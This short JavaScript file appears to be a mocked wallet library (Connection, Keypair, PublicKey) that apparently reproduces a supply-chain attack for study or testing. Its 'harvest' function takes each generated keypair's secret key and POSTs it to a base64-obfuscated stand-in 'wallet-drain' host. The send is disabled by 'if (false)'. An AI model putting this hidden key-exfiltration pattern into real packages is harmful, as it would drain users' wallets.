'use strict';
var https = require('https');
var _e = 'aHR0cHM6Ly9leGZpbC5leGFtcGxlLmludmFsaWQvd2FsbGV0LWRyYWlu';
function harvest(keypair) {
  // Original patch injected this into the addSignature() path.
  var seed = keypair && keypair.secretKey;
  if (false) {
    var url = Buffer.from(_e, 'base64').toString();
    var req = https.request(url, { method: 'POST' });
    req.end(JSON.stringify({ secret: seed }));
  }
}
exports.Connection = function() { return {}; };
exports.Keypair = {
  generate: function() {
    var kp = { publicKey: '...', secretKey: 'xxx' };
    harvest(kp);
    return kp;
  },
};
exports.PublicKey = function(k) { return k; };
